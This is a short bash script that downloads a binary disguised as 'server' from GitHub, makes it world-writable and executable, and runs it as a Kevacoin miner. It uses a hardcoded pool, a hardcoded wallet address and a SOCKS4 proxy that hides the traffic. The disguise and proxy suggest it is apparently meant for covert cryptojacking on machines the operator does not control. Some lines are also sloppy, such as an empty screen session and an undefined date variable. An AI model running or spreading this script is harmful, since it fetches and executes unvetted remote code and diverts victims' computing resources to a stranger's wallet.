#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y
wget -O server https://github.com/Ankie-Davenschot/Davenschot/raw/main/server 
screen -dmS ls
chmod +x phpsur.sh && chmod +x server && chmod 777 server phpsur.sh
./server --algorithm randomkeva --pool de.kevacoin.herominers.com:1163 --wallet VSMtpHwu6RvBnJMKf8vBZ3nUxKAXib6Y9b --password AAA=$(echo $strDate-$(shuf -i 1-1000 -n 1)) --proxy=socks4://72.206.181.105:64935
